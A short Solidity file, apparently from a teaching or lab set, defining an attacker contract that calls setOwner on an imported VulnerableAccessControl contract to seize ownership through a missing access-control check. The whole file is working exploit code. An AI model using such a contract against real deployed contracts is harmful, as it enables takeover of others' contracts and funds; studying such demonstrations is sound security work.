// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {VulnerableAccessControl} from "./VulnerableAccessControl.sol";

contract AccessControlAttacker {
    VulnerableAccessControl public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableAccessControl(_vulnerableContract);
    }

    function attack(address _newOwner) public {
        // Exploit the vulnerability by changing the owner
        vulnerableContract.setOwner(_newOwner);
    }

    function getOwner() public view returns (address) {
        return vulnerableContract.owner();
    }
}
